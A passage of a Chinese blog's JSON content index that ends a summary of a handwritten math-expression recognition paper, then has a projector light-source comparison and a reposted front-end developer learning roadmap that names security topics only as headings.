C.T., Nakagawa, M.: Relationbased representation for handwritten mathematical expression recognition. In: ICDAR 2021: 16th International Conference Document Analysis and Recognition. pp. 7–19 (2021), https://doi.org/10.1007/978-3-030-86198-8_1 中使用一个额外的弱监督分支达到了53.35% Ding, H., Chen, K., Huo, Q.: An encoder-decoder approach to handwritten mathematical expression recognition with multi-head attention and stacked decoder. In: ICDAR 2021: 16th International Conference Document Analysis and Recognition. pp. 602–616 (2021), https://doi.org/10.1007/978-3-030-86331-9_39 中使用数据增强和Beam Search解码的大规模输入图像在CROHME 16/19两个数据集上分别达到了57.72%和61.38%，但这一方法的迭代时间更长。 作者认为本方法过于追求表达式的空间结构分辨率二损失了部分符号的识别性能。 总结 本文提出来一个SS-TD模型，并说明了该模型的良好新能，未来作者将进一步提升SS-TD的泛化性。","categories":[{"name":"研究生","slug":"研究生","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/"},{"name":"科研","slug":"研究生/科研","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E7%A7%91%E7%A0%94/"},{"name":"OCR","slug":"研究生/科研/OCR","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E7%A7%91%E7%A0%94/OCR/"}],"tags":[{"name":"手写体识别","slug":"手写体识别","permalink":"http://enderxiao.github.io/tags/%E6%89%8B%E5%86%99%E4%BD%93%E8%AF%86%E5%88%AB/"},{"name":"深度神经网络","slug":"深度神经网络","permalink":"http://enderxiao.github.io/tags/%E6%B7%B1%E5%BA%A6%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"},{"name":"深度学习","slug":"深度学习","permalink":"http://enderxiao.github.io/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"},{"name":"注意力机制","slug":"注意力机制","permalink":"http://enderxiao.github.io/tags/%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/"},{"name":"树形编码器","slug":"树形编码器","permalink":"http://enderxiao.github.io/tags/%E6%A0%91%E5%BD%A2%E7%BC%96%E7%A0%81%E5%99%A8/"}]},{"title":"投影仪选择","slug":"投影仪选择","date":"2023-06-05T05:49:40.000Z","updated":"2024-07-30T11:26:33.932Z","comments":true,"path":"2023/06/05/投影仪选择/","permalink":"http://enderxiao.github.io/2023/06/05/%E6%8A%95%E5%BD%B1%E4%BB%AA%E9%80%89%E6%8B%A9/","excerpt":"投影仪技术分析与产品对比","text":"投影仪技术分析与产品对比 投影仪技术分析😎 目前主流的优秀投影仪技术包括两种: LED全色光源 超高压汞灯光源 三色激光 单色激光 混合光源 投影仪原理 手机电视显示器等显示设备的原理是: 每一个像素使用**红绿蓝(RGB)**三色组合 使用不同的背光来实现不同的色彩素质 背光技术在很大程度上决定了屏幕的显示素质 例如OLED技术由于可以单独控制每个像素的光源亮度,而不需要使用背光技术因此能够达到更高的对比度以及色彩鲜艳度 那么与这些显示设备类似,投影仪成像起始点的光源也决定了投影仪画面的亮度、色准、对比度即我们肉眼感受到的: 画面是否不够亮看不清 画面的色彩还原度是否够高,比如人物肤色是否偏红或偏绿 较暗尝尽是否黑成一团,看不起细节 为什么起点光源会影响这么多? 这就涉及到投影仪的成像逻辑了,投影仪将一路光源通过折射分为三路后使用三种滤镜分为三种颜色后,靠显示芯片转化为彩色图像,最后放大成像 大致对比 光源 优点 缺点 三色激光 高色域,色准,亮度,对比度,能有效抑制蓝光 存在散斑,以及彩边问题 LED光源 LED灯寿命较长,色准良好(好于三色激光劣于三色激光)价格适中 亮度低于激光 单色激光 亮度对比度高于LED.价格位于三色激光与LED之间 容易偏色,光衰严重 超高压汞灯 亮度上限高 色彩不准,体积较大,噪音较大,散热不好 三色激光 根据小学二年级学过的激光的特点: 单色性好 相干性高 方向性强 单色性好 激光单色颜色准确,红就是红,蓝就是蓝,不存在红里泛紫蓝里泛绿的问题 并且激光能效高,易于达到非常高的亮度. 相干性高与方向性 这两位特性通常是相互影响的,即发散角越小相干性越强 举个栗子: 手电筒光源的发散角很大(照在地上圆圈很大) 激光的相干性可以分为空间相干性和时间相干性二种，分别表示空间不同位置光波场某些特性（例如相位）之间的相关性和空间点在不同时刻光波场之间的相关性。而通常我们定性地用**杨氏双缝干涉实验(又是你)**的干涉条纹的清晰程度来判别光束的相干性程度。 举个栗子:两滴雨滴打在水面上,产生的涟漪会相互抵消掉一部分,那么激光同理,近乎平行的两束同频率同相位的激光由于贴的太近,相互打架,于是造成一道光变量,而另一道光变暗的情况 散斑 体现在观感上就是显示高亮度纯色(因为只发生在同频率同相位的激光上)场景时,会很模糊 这一现象被称为散斑 目前处理这一现象有不同的解决方案如: 使用特质幕布 窗口抖动人为增加发散角 … 三色激光需要使用红绿蓝三种激光发射器分别发光,因此成本较高 彩边 此外激光投影还有彩边现象 即在显示纯白小图标或文字的情况下 白色的上边会有一圈蓝边 白色的下边会有一圈红边 而这一现象是由于颜色过度不均匀导致的 (可以使用LED光源中提到的方法进行测试) 可以看到折射出来的彩虹中红绿蓝有明显的界限 坚果N1 而坚果N1系列采用的抖动技术来避免这一问题 在成像前使用一个均光系统来让激光的光纤发散,即扩大发散角来降低光的相干性 (一块小透镜疯狂震动X) 同时N1自研了一套模块化的激光模组 使用相同的模组进行堆叠来产生不同的亮度,并且使得整个系列的产品保持同样的色准和对比度 即BUFF叠得越多!亮度就越高! 这一设计使得低端的产品不需要再额外生产光源,从而降低了研发以及生产的成本,使得他们家的三色激光产品可以做到比较低的价格(N1 3999) 单色激光 使用单色激光+荧光色轮的方式轮流合成其余颜色 一般以蓝色激光作为光源 我们知道激光的特性是什么呀~? 没错是单色性好,而这一技术显然并没有利用到激光的这一特性 显然这一技术的色准会收到影响,有时候甚至比不过LED 但这么做的好处则是利用了激光容易做到高亮度的特性 牺牲色准换取亮度,对比度,同时做到低于三色激光的价格 LED光源 LED具有更高的光源寿命,一般能达到数万小时 混色原理接近三色激光,分别使用红绿蓝三色LED灯珠进行发光,色准较好 且光源过度更自然(优于激光) 这一点可以使用通过如下方式进行验证: 投影仪显示纯白 让投影仪光纤穿过一个三棱镜的一面 观察投射到墙面上的彩虹 得到的结果大致如下图中所示 可以看到颜色之间的过渡会更柔和 但LED光源的亮度天花板基本在2400ANSI Lumers左右,很难很难再做到更高了,因此对弱光环境有一定要求. 高压汞灯 使用单色光作为光源,将RGB三色从单色光中分离出来再合成为彩色图像 可想而知分离再合成的方案会导致色彩的丢失,导致较差的单色性,给人的体验就是色准差 同时这一技术的光源寿命短,光衰严重 并且还在做这一技术的都是老厂家,系统软件跟不上体验很差. (使用这一技术的投影仪,大概就是学校里用的那种挂在天花板上的) 但是这一技术可以把亮度以较低的成本做到很高 混合光源 混合光源是由极米科技在今年提出来的新技术 它们希望结合激光和LED的特性,使用激光来弥补LED亮度上的不足,使用LED来弥补激光在频段上的缺陷 这一技术的结构图如下: 看上去很复杂X 采用五通道光路设计，主要由RGBB四通道LED+R激光组成，一方面用纯红色激光补足LED短板，通过红域的提高和激光亮度的增益，带来超高色域和超高亮度；另一方面用全色LED补足激光短板。 最终得到如下峰值亮度很高,同时光谱连贯的光谱图 从而消除了散斑,彩边的问题 如下是使用这一技术的投影仪得到的彩虹🌈(目前只有极米RS Pro 3采用) (是的又是这张图X,因为LED的彩虹我也没找到测试图X) 投影仪横向对比👥 型号 优点 缺点 技术 价格 坚果N1 自带云台支架,价格便宜,自动梯形校正很方便,小巧,110%BT.2020广色域,1600:1,10Bit色深 1080p,800CVIA流明 模块化三色激光+抖动技术 3999 坚果N1 Pro 自带云台支架,价格便宜,自动梯形校正很方便,1500CVIA流明,110%BT.2020广色域,1600:1,10Bit色深 1080p,略贵 模块化三色激光*2+抖动技术 5999 坚果N1 Pro 自带云台支架,价格便宜,自动梯形校正很方便,2200CVIA流明,110%BT.2020广色域,1600:1,10Bit色深,4K分辨率 贵,三色激光技术导致的物理特性问题 模块化三色激光*3+抖动技术 8999 极米RS Pro3 2500CVIA流明,散斑,彩边控制更好,95% DCI-P3,99.9%Rec.709,全自动光学变焦,杜比视界4K,哈曼卡顿音响,有配套立体声解决方案(需额外购买) 有单太贵,支架需要另外购买 自研混色激光 9399","categories":[{"name":"Life","slug":"Life","permalink":"http://enderxiao.github.io/categories/Life/"},{"name":"影音设备","slug":"Life/影音设备","permalink":"http://enderxiao.github.io/categories/Life/%E5%BD%B1%E9%9F%B3%E8%AE%BE%E5%A4%87/"}],"tags":[{"name":"Life","slug":"Life","permalink":"http://enderxiao.github.io/tags/Life/"},{"name":"投影仪","slug":"投影仪","permalink":"http://enderxiao.github.io/tags/%E6%8A%95%E5%BD%B1%E4%BB%AA/"}]},{"title":"前端技能树","slug":"前端技能树","date":"2023-05-31T05:41:27.000Z","updated":"2024-07-30T11:26:33.926Z","comments":true,"path":"2023/05/31/前端技能树/","permalink":"http://enderxiao.github.io/2023/05/31/%E5%89%8D%E7%AB%AF%E6%8A%80%E8%83%BD%E6%A0%91/","excerpt":"一份用于监督自己的以及反复复习的清单 搬运自 程序员鱼皮 开源地址：https://github.com/liyupi/code-roadmap","text":"一份用于监督自己的以及反复复习的清单 搬运自 程序员鱼皮 开源地址：https://github.com/liyupi/code-roadmap 这份学习路线并不完美，也不会有最终形态，正如前端不可预见、永无止境的未来。 💂 + 💻 = 👴🏽 建议先观看视频导读：https://www.bilibili.com/video/BV1nh411e7oG/ 路线特点 一份全面的前端知识点大梳理和汇总 分阶段学习，每个阶段给出学习目标 使用符号对知识点的重要程度做了区分，按需学习 知识点附有描述和资源链接 提供一份清晰的个人顺序学习路线方法 提供大量优质学习资源 符号表 可根据知识点前的符号按需选学，并获取知识点描述和学习资源。 ⭐️ 必学（追求速成） ✅ 建议学（重要知识） ❗ 面试重点 ❌ 一般没必要学习 💬 描述 📚 资源 🎯 目标 大纲 前言 - 学编程需要的特质 前端学习七阶段 前端入门 巩固基础 前端工程化 前端优化 前端生态 前端求职 前端未来 我的前端学习路线 尾声 - 持续学习 前言 - 学编程需要的特质 相信自己有能力，那么你就真的会有！ 兴趣 坚持 付出 心态 一、前端入门 💬 描述：学习前端基础三件套，建议从实战开始，边学边练，培养兴趣，快速入门。 📚 资源 freeCodecamp 在线编程：https://learn.freecodecamp.one/ 阿里云前端实战学习：https://edu.aliyun.com/roadmap/frontend W3Cschool 编程入门实战：https://www.w3cschool.cn/codecamp/ pink老师前端入门教程：https://www.bilibili.com/video/BV14J4114768 🎯 目标：了解和实践各语言的基础语法，并能使用开发工具来独立开发一个留言板网站。 ⭐️ 开发工具 💬 描述：工欲善其事，必先利其器。 浏览器 ⭐️ Chrome ✅ Edge ✅ Firefox ❌ Opera Safari 编辑器 ⭐️ VSCode ✅ WebStorm Atom ⭐️ Sublime Text HBuilder X 记事本 在线 IDE 文档笔记 ✅ Markdown 语法 ✅ Typora 在线笔记 语雀 腾讯文档 石墨文档 印象笔记 Mdnice ⭐️ HTML 💬 描述：用于定义一个网页结构的基本技术。 📚 资源：https://developer.mozilla.org/zh-CN/docs/Learn/HTML ⭐️ 基本语法✅ ⭐️ 标签✅ 分区 div 标题 h1 ~ h6 段落 p 图像 img 列表 ul / ol 超链接 a 表单 form 表格 table 框架 iframe ⭐️ 属性✅ ✅ HTML5 特性 语义化标签 浏览器支持 多媒体标签 Canvas 画布 ❌ 内联 SVG 本地存储 localStorage sessionStorage ❌ Web SQL Web Workers 应用缓存（Cache Manifest） 无障碍 ⭐️ CSS 💬 描述：层叠样式表，用于设计风格和布局。 📚 资源：https://developer.mozilla.org/zh-CN/docs/Learn/CSS ⭐️ 基本语法✅ ⭐️ 引入方式✅ 行内样式 内部样式表 外部样式表 ⭐️ 选择器✅ 通用选择器 标签选择器 id 选择器 class 选择器 属性选择器 派生选择器 后代选择器 子元素选择器 相邻兄弟选择器 组合选择器 伪选择器 选择器优先级 ⭐️ 属性 单位✅ px em rem vw vh 背景✅ 文本✅ 字体✅ 列表✅ 表格 ⭐️ 文档流✅ 标准流 浮动流 定位流 ⭐️ 内联元素 / 块状元素✅ ⭐️ 盒子模型✅ content padding border margin ⭐️ 浮动✅ 设置浮动 float 清除浮动 clear ⭐️ 定位✅ static absolute fixed relative sticky ⭐️ 层叠规则✅ ❗ BFC 和 IFC 机制 CSS3 ⭐️ 响应式布局 媒体查询 Flex 布局✅ Grid 布局✅ 瀑布流 动画✅ 过渡✅ 渐变✅ 背景✅ 边框✅ 圆角✅ 字体✅ 2D / 3D 转换✅ ⭐️ JavaScript 💬 描述：具有函数优先的轻量级，解释型或即时编译型的编程语言。 📚 资源：https://developer.mozilla.org/zh-CN/docs/Web/JavaScript ⭐️ 基本语法✅ ⭐️ 数据类型✅ 值类型✅ 字符串 String 数组 Number 布尔 Boolean 空值 Null 未定义 Undefined Symbol 引用类型✅ 对象 Object 数组 Array 函数 Function ✅ 数据类型转换✅ ✅ 函数✅ ⭐️ 概念✅ ⭐️ 自定义函数✅ 调用方式✅ ⭐️ 全局调用✅ 构造函数调用✅ ⭐️ 函数方法调用✅ apply✅ call✅ ✅❗ 闭包✅ ✅ 对象✅ 概念✅ this✅ 原型链和继承✅ 常用对象✅ 数字 Number 字符串 String 对象 日期 Date 对象 数组 Array 布尔 Boolean 算数 Math 自定义对象 ✅❗ 作用域（作用域链）✅ ✅ BOM API✅ ⭐️ DOM API✅ ⭐️ JSON✅ ⭐️ Ajax ✅ JavaScript 执行机制✅ ✅ ES6+ 特性 💬 描述：新引入的 JavaScript 语法特性。 📚 资源：ES6 入门教程 https://es6.ruanyifeng.com/ let 和 const✅ 变量解构赋值✅ 对象扩展和新增方法✅ Symbol Set 和 Map 数据结构 ⭐️❗ Promise &amp; async / await 异步编程 Generator 函数异步编程 二、巩固基础 💬 描述：学习前端、计算机、软件开发相关基础知识，并复习巩固上阶段学到的前端三件套。 📚 资源 《JavaScript 高级程序设计》：https://www.code-nav.cn/rd/?rid=28ee4e3e606b1e1a0e3cfd8952d172cf 《JavaScript 忍者秘籍》：https://www.code-nav.cn/rd/?rid=28ee4e3e606b16c00e3c5b18609e3dc2 🎯 目标：熟悉前端三件套语法，尤其是 JavaScript，并了解互联网、域名、浏览器、服务器等，扎实前端程序员的基本功，为下面进入实战开发做准备。 前端基础知识 ✅ 互联网 ⭐️ 域名 ⭐️ DNS ⭐️ 服务器 ✅ 浏览器 浏览器 DOM 事件流 / 事件委托 ⭐️ 浏览器加载顺序 ⭐️ 浏览器渲染过程 浏览器事件循环 浏览器同源策略 ❗ 跨域解决方案 浏览器缓存 控制台调试技巧 ✅ HTTP ❗ HTTP 请求过程 常见 HTTP 协议 HTTP 1.0 ⭐️ HTTP 1.1 HTTP 2 HTTP 3 ⭐️ HTTP 请求类别 ⭐️ 常见状态码 1xx 信息 2xx 成功 3xx 重定向 4xx 客户端错误 5xx 服务器错误 WebSocket ⭐️ Cookie Session ⭐️ HTTPS 计算机基础 ✅ 算法和数据结构 ⭐️ 时间 / 空间复杂度分析✅ 数据结构✅ 数组 字符串 队列 栈 链表 集合 哈希表 二叉树 算法✅ 排序 双指针 查找 分治 动态规划 递归 回溯 贪心 位运算 DFS BFS 图 ✅ 计算机网络 HTTP 协议 网络模型 UDP / TCP 协议 ✅ 操作系统✅ 进程、线程 进程 / 线程间通讯方式 进程调度算法 进程 / 线程状态 死锁 内存管理 软件开发基础 ✅ 设计模式 单例模式 代理模式 工厂模式 装饰者模式 观察者模式 策略模式 门面模式 ⭐️ Git 版本控制✅ 常用命令 ✅ Linux 服务器 常用命令 ✅ 正则表达式✅ 三、前端工程化 💬 描述：前端工程化是使用软件工程的技术和方法来进行前端的开发流程、技术、工具、经验等规范化、标准化，其主要目的为了提高开发过程中的开发效率，减少不必要的重复工作时间。 📚 资源 什么是前端工程化？https://www.zhihu.com/question/433854153/answer/1713597311 🎯 目标：至少学会一门主流的前端开发框架（Vue / React），并配合脚手架、组件库、工具等从 0 开始独立搭建并开发一个完整的前端网站，可以试着仿一些知名站点。要求遵循企业开发规范，将项目代码提交到代码仓库中，并独立发布上线，供他人访问。此外，建议抓住机会参与一些团队项目，感受团队开发模式和前端工程化的优势。 ⭐️ 研发流程 技术选型 初始化 开发 本地测试 代码提交 编译、打包、构建 部署 集成测试 发布上线 监控运维 ⭐️ 代码托管✅ 💬 描述：集中存储、备份你的代码，还能和团队成员协作开发。 ⭐️ GitHub Gitee GitLab ✅ Node.JS 💬 描述：一个开源与跨平台的 JavaScript 运行时环境。 它是一个可用于几乎任何项目的流行工具！ 📚 资源 Node.js 官方教程：http://nodejs.cn/learn Node.js 入门：https://cnodejs.org/getstart ⭐️ 包管理 💬 描述：用于安装 Node.js 的扩展、工具等。 ⭐️ npm ⭐️ yarn ❌ bower ✅ npx 开发框架 Express Koa Egg 开发框架 💬 描述：解决特定的问题,提高开发效率、简化我们的代码复杂度。 ⭐️ CSS 框架 ✅ BootStrap ⭐️ Tailwind CSS ⭐️ JavaScript 框架 ⭐️ Vue✅ Vue Router Vuex ⭐️ React React DOM React Router Redux MobX React Hooks ❌ Angular RxJS NgRx ✅ Svelte ✅ UmiJS 封装库 ⭐️ 组件库 ✅ LayUI ⭐️ ElementUI（Vue） ✅ VantUI（Vue） ⭐️ Ant Design（React） Material UI 数据可视化 ✅ AntV Apache ECharts HighCharts D3.js 组件（插件） 富文本编辑器 弹窗 轮播图✅ 工具库 ✅ jQuery ✅ Lodash ✅ Axios 时间处理 Moment.js 动效库 ✅ Animate.css Ant Motion 字体图标库 ⭐️ IconFont IconPark Font Awesome ⭐️ 脚手架 💬 描述：快速生成新项目的目录模板，提升开发效率和开发舒适性。 📚 资源：https://www.jianshu.com/p/25ce8cf2e6a7 Vue CLI create-react-app ✅ Yeoman ⭐️ 前端架构设计 💬 描述：一系列工具和流程的集合，旨在提升前端代码的质量，并实现高效可持续的工作流。 模块化 组件化 ✅ MVVM 设计原则 ⭐️ SPA 单页应用 ⭐️ 多页应用 ✅ 前端路由 PWA 有损服务 ✅ 服务端渲染 💬 描述：在服务端渲染 HTML 页面的模式。 📚 资源：https://www.zhihu.com/question/379563505 Next.js（React） Nuxt.js（Vue） ❌ Universal（Angular） BFF 💬 描述：Backend For Frontend（服务于前端的后端），就是服务器设计 API 时会考虑前端的使用，并在服务端直接进行业务逻辑的处理。 📚 资源：https://www.jianshu.com/p/eb1875c62ad3 GraphQL ✅ 微前端 💬 描述：将前端应用分解成一些更小、更简单的能够独立开发、测试、部署的小块，从而解决庞大的一整块后端服务带来的变更与扩展方面的限制。 📚 资源：https://zhuanlan.zhihu.com/p/96464401 qiankun single-spa CSS in JS 💬 描述：用 JavaScript 来写 CSS。 📚 资源：http://www.ruanyifeng.com/blog/2017/04/css_in_js.html 内联样式 声明样式 引入样式 ⭐️ CSS 模块化 ⭐️ CSS Modules ✅ styled-components ✅ Styled JSX Emotion ✅ 开发调试 💬 描述：本地开发时热更新，提升开发效率。 webpack-dev-server serve 内网穿透 💬 描述：将内网外网通过 nat 隧道打通，让内网的网站、数据让外网可以访问。 Ngrok NATAPP ⭐️ CSS 预编译 💬 描述：使用新的扩展语言以增强 CSS 的能力，并通过预编译的方式将其转换为浏览器认识的 CSS 代码。 ⭐️ SASS ✅ PostCSS Stylus ❌ LESS 测试 测试分类 ⭐️ UT 单元测试 SIT 系统集成测试 E2E 端到端测试 UAT 用户验收测试 ✅ Mock 💬 描述：通过随机数据，模拟各种场景，增加单元测试的真实性。 Mock.js ✅ 测试框架 ✅ Jest Enzyme ✅ Puppeteer（Headless Browser） Mocha Jasmine ✅ 代码质量 开发规范 💬 描述：依照规范写出的代码会更加合理。 📚 资源：Airbnb 代码规范 https://github.com/BingKui/javascript-zh CSS Style Guide JavaScript Style Guide 类型校验 TypeScript 代码检查 ESLint StyleLint 代码风格 💬 描述：根据配置自动格式化代码，统一格式。 Prettier 提交规范 约定式提交 提交检查 💬 描述：在提交代码时触发一些操作，比如检查代码的风格等。 pre-commit husky 构建工具 自动化构建 💬 描述：按照配置好的流程自动打包构建项目，提高团队的开发效率，降低项目的维护难度。 Gulp ✅ npm script Grunt 打包工具 💬 描述：将各种零散的📚 资源文件打包为可在浏览器等环境运行的代码。 ⭐️ Webpack ✅ Rollup ✅ Vite Parcel Snowpack CI / CD 💬 描述：通过在应用开发阶段引入自动化来频繁向客户交付应用。 GitLab CI ✅ Jenkins 部署 ⭐️ Web 服务器 ⭐️ Nginx 💬 描述：高性能的 HTTP 和反向代理 web 服务器。 📚 资源：腾讯云动手实验室 https://cloud.tencent.com/developer/labs/gallery 反向代理 解决跨域 改写请求 ✅ Apache 容器 ✅ Docker 💬 描述：容器是一个标准化的软件单元，它将代码及其所有依赖关系打包，以便应用程序从一个计算环境可靠快速地运行到另一个计算环境。Docker容器镜像是一个轻量的独立的可执行的软件包。包含程序运行的时候所需的一切：代码，运行时间，系统工具，系统库和设置。 📚 资源：Docker 从入门到实践 https://vuepress.mirror.docker-practice.com/ Dockerfile Kubernetes 部署策略 全量发布 蓝绿部署 滚动发布 灰度发布 监控告警 前端埋点 错误监控 性能监控 行为监控 四、前端优化 💬 描述：通过分析和优化手段，提高网站的性能和用户体验。 🎯 目标：实践前端优化方法，从多个方面优化自己做过的项目，最好能将优化后的网站与原网站进行对比，得到一些数据和体验上的明显提升。 ✅ 性能优化 性能指标 💬 描述：用于衡量一个 Web 页面的性能。 📚 资源：https://juejin.cn/post/6844904153869713416 FP（First Paint） 💬 描述：从开始加载到浏览器首次绘制像素到屏幕上的时间，也就是页面在屏幕上首次发生视觉变化的时间。 FCP（First Contentful Paint） 💬 描述：浏览器首次绘制来自 DOM 的内容的时间。 FMP（First Meaningful Paint） 💬 描述：页面的主要内容绘制到屏幕上的时间。 FSP（First Screen Paint） 💬 描述：页面从开始加载到首屏内容全部绘制完成的时间，用户可以看到首屏的全部内容。 TTI（Time to Interactive） 💬 描述：表示网页第一次完全达到可交互状态的时间点，浏览器已经可以持续性的响应用户的输入。 优化手段 性能监控 Performance API 样式优化 JavaScript 优化✅ 防抖 节流 代码分割 📚 资源压缩 打包优化 服务器优化 缓存优化 Service Worker 动画性能 dns-prefetch Lazy loading 优化启动性能 异步化 渲染优化 网络优化 移动端性能优化 ✅ CDN 💬 描述：内容分发网络，是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。 📚 资源：BootCDN https://www.bootcdn.cn/ 用户体验 设计系统 骨架屏 ✅ 兼容性 浏览器兼容性 normalize.css html5shiv.js respond.js Babel Polyfill 屏幕分辨率兼容性 跨平台兼容性 SEO 💬 描述：搜索引擎优化，利用搜索引擎的规则提高网站在有关搜索引擎内的自然排名。 📚 资源：百度搜索📚 资源平台 https://ziyuan.baidu.com/cooperateresource/index robots.txt description keywords SiteMap HTML 标签优化 站内链接建设 友情链接 ✅ 安全 ⭐️ XSS CSRF 反爬虫 SQL 注入 DDoS 五、前端生态 💬 描述：如今，前端领域的范围越来越广，出现了更多前端工程师需要了解和关注的技术。 🎯 目标：能用学到的前端技术去做更多的事情，比如开发个人博客、文档网站、小程序、APP 等。 ⭐️ 静态站点构建 开发 React Static 博客 ✅ Gatsby.js ✅ Docusaurus Hugo Hexo 文档 JekyII ⭐️ Docsify VuePress ✅ Dumi ✅ 大前端 💬 描述：前端技术的融合更加紧密，应用的领域也更加广泛，前端领域的内容呈现多样化，除了网站外，还可以用前端技术跨平台开发 Android、iOS、小程序、虚拟现实、增强现实等。 移动应用 Hybrid WebView React Native✅ Flutter 移动应用打包 Weex Cordova Phonegap Ionic 桌面应用 Electron NW.js Proton Native 小程序 原生 WebView 跨端开发框架 ✅ uni-app ✅ Taro Flutter Chameleon Wepy Rax 移动端调试 Chrome Dev Tools Android Simulator IOS Simulator ✅ Serverless 💬 描述：一种构建和管理基于微服务架构的完整流程，允许你在服务部署级别而不是服务器部署级别来管理你的应用部署，你甚至可以管理某个具体功能或端口的部署，这就能让开发者快速迭代，更快速地开发软件。 ✅ 云开发 💬 描述：云端一体化的后端云服务 ，采用 Serverless 架构，免去了移动应用构建中繁琐的服务器搭建和运维。同时云开发提供的静态托管、命令行工具（CLI）、Flutter SDK 等能力降低了应用开发的门槛。使用云开发可以构建完整的小程序/小游戏、H5、Web、移动 App 等应用。 ✅ 腾讯云云开发 阿里云云开发 低代码 💬 描述：无需编码（零代码）或通过少量代码就可以快速生成应用程序的开发平台。通过可视化进行应用程序开发的方法，使具有不同经验水平的开发人员可以通过图形化的用户界面，使用拖拽组件和模型驱动的逻辑来创建网页和移动应用程序。 腾讯云低码 阿里宜搭 六、前端求职 💬 描述：求职是一个漫长的过程，建议拉长战线，尽早准备。 🎯 目标：找到理想的工作。 流程 2020 秋招面经汇总：https://www.nowcoder.com/discuss/205497 简历 超级简历 面试题库 牛客前端工程师面试宝典：https://www.nowcoder.com/tutorial/96/f5212664ab664984882b00635066ded2 前端面试每日 3+1：https://github.com/haizlin/fe-interview React 面试题目 &amp; 题解：https://github.com/sudheerj/reactjs-interview-questions 面经 前端面经汇总：https://www.nowcoder.com/discuss/experience?tagId=644 面试实战 AI 模拟面试：https://www.nowcoder.com/interview/ai/cover?jobTagId=644 七、前端未来 💬 描述：前端未来可能的发展趋势和热门技术。 🎯 目标：关注前沿，持续进步。 WebAssembly 智能 UI React Server Component CSS Houdini WebComponents HTML templates（HTML模板） Custom elements（自定义元素） Shadow DOM（影子DOM） 我的前端学习路线 虽然上面整理的学习路线知识点非常多，但是大家也别太担心，其实按照一定顺序和方法来学习，并不会很难，聊聊我的学习经历。 1. 快速入门，培养兴趣 刚开始学习前端时，一定要以培养兴趣、快速入门为目标。我入门前端时，由于没有基础、啥都不懂，因此选择在线实战教程网站来学习，跟着教程案例一行行把代码敲下来，实时浏览显示效果，很轻松地就把 HTML、CSS、JavaScript 的语法基础过了一遍。但是这时，我对看过的知识点没有什么印象，基本是看了就忘，当我想要自己写一个网站，也根本无从下手。 于是，我开始试着死记硬背代码，结果发现背了之后还是不会写。那干脆一不做二不休，直接打开编辑器和教程网站，把之前在线实战时敲过的代码复制粘贴到编辑器中，然后再修改保存，到浏览器中打开文件。这样虽然要在编辑器和浏览器中来回切换，但起码能看到自己的网页文件运行的效果了。后来，我利用浏览器开发者工具提升了自己开发网站的调试效率，敲出的代码达不到满意的效果时，就再去查，再改，再浏览，最后终于完成了一个留言板网站！ 通过这件事，我明白了一个道理，既然记不住知识，那就先别强行记忆，上手多写，忘了就去查不就好了？不要担心自己知识不够做不出来，只要你去试，都一定能实现。 2. 多看多写，巩固基础 在这种操作下，我虽然能使用基础三件套开发简易网站了，但做的很慢，还老出问题。于是，我开始完整地看了几本前端入门和项目实战书籍，有三件套入门的，也有响应式网站设计的，还有 JavaScript 综合讲解的，以及一套完整的视频教程，通过这些来复习巩固之前学过的知识，打好了基础，并且了解了更多实战教程上没见到的知识。 看书和视频的过程中，我跟着做了几个简易的网站，也是边看边做。在这之后，我发现自己渐渐地能够脱离文档来写网站了！ 3. 框架学习，学以致用 但是，总感觉开发网站时，什么都要自己写，重复的代码写一大堆，很麻烦。于是，我试着上网搜了解决这些问题的方法，发现可以用组件库减少重复编写 HTML 和 CSS 代码，于是学了 LayUI，其实和之前一样的，就是打开官网找到要用的组件，然后复制到项目中修改就行了，写的多了竟然还真记住了一些（虽然这个没必要记）。 界面和样式代码简化了，但是 JavaScript 写的我依旧头疼。于是我决定进入下一个阶段的学习，当时先看了本书叫《锋利的 jQuery》来学习 jQuery，学会之后使用它趁热打铁做了几个网站，发现的确能大大简化繁琐的 JavaScript DOM 操作，让我尝到了甜头，又有了继续学习前端的动力。 在那之后大概半年，我开始学习主流前端框架 Vue，也是跟着视频教程学，并且结合 ElementUI 组件库开发了一个响应式网站。不得不说，习惯了用原生 JavaScript 和 jQuery 开发后，再去用 Vue 开发，真的是爽飞了，小有成就感。 4. 根据需要，自主学习 在那之后，我就是通过不断地做项目来积累经验，既然编程知识太多学不完，那我就随需随学，逐渐拓宽自己的知识面。举个例子，我要做一个移动端 H5 页面，那就去搜 Vue 的移动端组件库，学会了 MintUI、VantUI 等；项目中要处理日期，那我就去搜日期处理库，学会了 Moment.js；项目重复文件和代码太多，我就去网上搜一些组件化、模块化的最佳实践；项目代码太大、加载太慢，我就去网上搜一些前端压缩、性能优化的方式；要把开发好的项目变成 APP，那我就去网上搜到了 Cordova 等打包工具；跟其他同学一起做项目时比较混乱、开发效率低，我就去搜了一些代码规范、前端工程化等；遇到 Bug 时，也是自己去网上搜索解决方案，并且还要看看有没有知识点是我遗漏的，我会再去弥补学习。通过不断实践、不断遇到问题和自主解决问题，我始终保持着学习的积极性，学到了越来越多前端的知识，并通过归纳总结来加深印象。 5. 渐入佳境，拓宽视野 在那之后，我学前端技术非常快了，像 React、TypeScript、Redux、Dva、Umi、Lerna 等等都随用随学，随学随用。此外，我不仅仅关注前端网页开发本身，还同时关注前端的生态和发展，学习了微前端、Serverless、云开发、低代码等技术，因此个人的能力提升也很大。如今在鹅厂工作中也是，面对各种不同技术栈的前端项目，我都能迎难而上，毕竟不会就学嘛！ 哦，写的渐入佳境，我都忘了，自己是一名后端工程师，还搁这儿吹牛逼呢（ 所以本路线难免会有不专业的地方，请大家见谅~ 6. 总结 总结一下，学前端的路线其实就一句话：基础三件套 =&gt; 巩固基础 =&gt; 学习框架 =&gt; 多做项目 =&gt; 按需学习 =&gt; 拓宽视野。还有一个学任何编程技术都要注意的点，全程多敲代码！多敲代码！多敲代码！ 尾声 - 持续学习 优秀前端人的特质 深厚的功底 良好的编码习惯 发现问题的洞察力 思维灵活，善于思考 追求技术，紧跟前沿 有创造力，有行动力 追求用户体验 时刻保持好奇 